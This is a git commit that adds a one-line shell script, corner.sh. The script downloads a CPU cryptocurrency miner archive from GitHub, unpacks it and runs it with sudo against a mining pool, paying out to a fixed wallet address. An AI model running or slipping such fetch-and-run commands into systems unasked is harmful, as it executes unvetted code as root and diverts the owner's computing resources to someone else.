51b09c4676b97c782d8a4344564c06ad37d8dd4a
nildex10 <97752942+nildex10@users.noreply.github.com>
2022-09-09 02:18:35 -0300

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && sudo tar -xf hellminer_cpu_linux.tar.gz && sudo ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RT58dqq76Yk6iZX8Evm7k9RGsdFj25GzyV.Test1 -p x --cpu 30
